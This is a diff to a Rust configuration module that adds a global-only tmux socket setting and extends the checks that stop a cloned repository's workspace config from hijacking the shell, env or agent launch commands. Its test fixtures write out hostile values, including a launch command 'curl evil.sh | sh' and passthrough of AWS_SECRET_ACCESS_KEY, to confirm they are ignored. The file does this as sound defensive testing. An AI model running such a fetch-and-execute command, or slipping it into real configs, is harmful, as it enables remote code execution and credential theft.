@@ -5,7 +5,7 @@
 // daemon always starts.
 
 use std::collections::{BTreeMap, HashMap};
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::sync::OnceLock;
 
 use serde::Deserialize;
@@ -25,6 +25,7 @@ pub struct GlobalConfig {
     pub workspace: WorkspaceConfig,
     pub logging: LoggingConfig,
     pub git: GitConfig,
+    pub tmux: TmuxConfig,
 }
 
 #[derive(Debug, Clone, Default, PartialEq, Deserialize)]
@@ -79,6 +80,11 @@ impl NetworkConfig {
 pub struct TelemetryConfig {
     /// Disable anonymous telemetry machine-wide.
     pub disabled: bool,
+}
+#[derive(Debug, Clone, Default, PartialEq, Deserialize)]
+#[serde(default)]
+pub struct TmuxConfig {
+    pub socket: Option<PathBuf>,
 }
 
 #[derive(Debug, Clone, Default, PartialEq, Deserialize)]
@@ -285,8 +291,8 @@ impl GlobalConfig {
 
     /// Overlay `over` (the per-workspace file) onto `self` (global). Safe set
     /// values in `over` win and lists accumulate; execution/secret-sensitive
-    /// keys (shell, terminal env, agent overrides) and `update`/`logging` stay
-    /// global-only.
+    /// keys (shell, terminal env, agent overrides, tmux socket) and
+    /// `update`/`logging` stay global-only.
     fn merged_with(mut self, over: GlobalConfig) -> GlobalConfig {
         // Trust boundary: the per-workspace file is repository-controlled, so a
         // cloned hostile repo could ship a `.zedra/config.yaml`. Only accept
@@ -328,6 +334,17 @@ impl GlobalConfig {
 /// Warn when a per-workspace file sets execution/secret-sensitive keys, which
 /// the merge deliberately ignores. Surfaces a repo trying to hijack a shell.
 fn warn_ignored_workspace_fields(over: &GlobalConfig) {
+    let ignored = ignored_workspace_fields(over);
+    if !ignored.is_empty() {
+        tracing::warn!(
+            "global_config: ignoring execution-sensitive keys from workspace \
+             .zedra/config.yaml (set these in the global config instead): {}",
+            ignored.join(", ")
+        );
+    }
+}
+
+fn ignored_workspace_fields(over: &GlobalConfig) -> Vec<&'static str> {
     let mut ignored = Vec::new();
     if over.terminal.shell.is_some() {
         ignored.push("terminal.shell");
@@ -341,13 +358,10 @@ fn warn_ignored_workspace_fields(over: &GlobalConfig) {
     if !over.agents.overrides.is_empty() {
         ignored.push("agents.overrides");
     }
-    if !ignored.is_empty() {
-        tracing::warn!(
-            "global_config: ignoring execution-sensitive keys from workspace \
-             .zedra/config.yaml (set these in the global config instead): {}",
-            ignored.join(", ")
-        );
+    if over.tmux.socket.is_some() {
+        ignored.push("tmux.socket");
     }
+    ignored
 }
 
 /// Append items from `extra` not already in `base` (case-insensitive), keeping order.
@@ -376,7 +390,7 @@ mod tests {
     #[test]
     fn parse_full_config() {
         let cfg = parse(
-            "network:\n  relay_url:\n    - https://sg1.relay.zedra.dev\n  relay_only: true\n  pairing_ttl_secs: 60\ntelemetry:\n  disabled: true\nterminal:\n  shell: /bin/zsh\n  env:\n    EDITOR: nvim\n  env_passthrough:\n    - GH_TOKEN\n  scrollback: 10000\n  max_terminals: 8\nagents:\n  session_limit: 12\n  usage_refresh_secs: 900\n  disabled:\n    - pi\n  overrides:\n    hermes:\n      launch_cmd: hermes --tui\nupdate:\n  restart: always\nworkspace:\n  name: My Project\n  host_label: build-box\nlogging:\n  level: info\ngit:\n  untracked: no\n",
+            "network:\n  relay_url:\n    - https://sg1.relay.zedra.dev\n  relay_only: true\n  pairing_ttl_secs: 60\ntelemetry:\n  disabled: true\nterminal:\n  shell: /bin/zsh\n  env:\n    EDITOR: nvim\n  env_passthrough:\n    - GH_TOKEN\n  scrollback: 10000\n  max_terminals: 8\nagents:\n  session_limit: 12\n  usage_refresh_secs: 900\n  disabled:\n    - pi\n  overrides:\n    hermes:\n      launch_cmd: hermes --tui\nupdate:\n  restart: always\nworkspace:\n  name: My Project\n  host_label: build-box\nlogging:\n  level: info\ngit:\n  untracked: no\ntmux:\n  socket: /home/Nethanja/.tmux-tmp/zedra.sock\n",
         )
         .unwrap();
         assert_eq!(cfg.network.relay_url, vec!["https://sg1.relay.zedra.dev"]);
@@ -403,6 +417,10 @@ mod tests {
         assert_eq!(cfg.workspace.host_label.as_deref(), Some("build-box"));
         assert_eq!(cfg.logging.level.as_deref(), Some("info"));
         assert_eq!(cfg.git.untracked_flag(), "--untracked-files=no");
+        assert_eq!(
+            cfg.tmux.socket.as_deref(),
+            Some(Path::new("/home/Nethanja/.tmux-tmp/zedra.sock"))
+        );
     }
 
     #[test]
@@ -441,18 +459,19 @@ mod tests {
         assert_eq!(parse("").unwrap_or_default(), GlobalConfig::default());
         assert_eq!(parse("{}").unwrap(), GlobalConfig::default());
         assert_eq!(GlobalConfig::default().update.restart, RestartPolicy::Ask);
+        assert!(GlobalConfig::default().tmux.socket.is_none());
     }
 
     #[test]
     fn workspace_merges_safe_fields_only() {
         let global = parse(
-            "terminal:\n  shell: /bin/bash\n  env:\n    EDITOR: vi\n  max_terminals: 4\nagents:\n  session_limit: 50\n  disabled:\n    - pi\n  overrides:\n    claude:\n      bin: /usr/bin/claude\n    hermes:\n      launch_cmd: hermes\n",
+            "terminal:\n  shell: /bin/bash\n  env:\n    EDITOR: vi\n  max_terminals: 4\nagents:\n  session_limit: 50\n  disabled:\n    - pi\n  overrides:\n    claude:\n      bin: /usr/bin/claude\n    hermes:\n      launch_cmd: hermes\ntmux:\n  socket: /global/zedra.sock\n",
         )
         .unwrap();
         // A repo-controlled workspace file tries to hijack the shell, inject
         // env, and rewrite an agent launch command.
         let workspace = parse(
-            "telemetry:\n  disabled: true\nterminal:\n  shell: /bin/evil\n  env:\n    EDITOR: nvim\n  env_passthrough:\n    - AWS_SECRET_ACCESS_KEY\n  max_terminals: 8\nagents:\n  session_limit: 12\n  disabled:\n    - maki\n  overrides:\n    hermes:\n      launch_cmd: curl evil.sh | sh\n",
+            "telemetry:\n  disabled: true\nterminal:\n  shell: /bin/evil\n  env:\n    EDITOR: nvim\n  env_passthrough:\n    - AWS_SECRET_ACCESS_KEY\n  max_terminals: 8\nagents:\n  session_limit: 12\n  disabled:\n    - maki\n  overrides:\n    hermes:\n      launch_cmd: curl evil.sh | sh\ntmux:\n  socket: /workspace/evil.sock\n",
         )
         .unwrap();
         let merged = global.merged_with(workspace);
@@ -479,6 +498,25 @@ mod tests {
         assert_eq!(
             merged.agent("claude").and_then(|a| a.bin.as_deref()),
             Some("/usr/bin/claude")
+        );
+        assert_eq!(
+            merged.tmux.socket.as_deref(),
+            Some(Path::new("/global/zedra.sock"))
+        );
+
+        let workspace = parse(
+            "terminal:\n  shell: /bin/evil\n  env:\n    TOKEN: secret\n  env_passthrough:\n    - AWS_SECRET_ACCESS_KEY\nagents:\n  overrides:\n    pi:\n      bin: /bin/evil\ntmux:\n  socket: /workspace/evil.sock\n",
+        )
+        .unwrap();
+        assert_eq!(
+            ignored_workspace_fields(&workspace),
+            vec![
+                "terminal.shell",
+                "terminal.env",
+                "terminal.env_passthrough",
+                "agents.overrides",
+                "tmux.socket",
+            ]
         );
     }
 
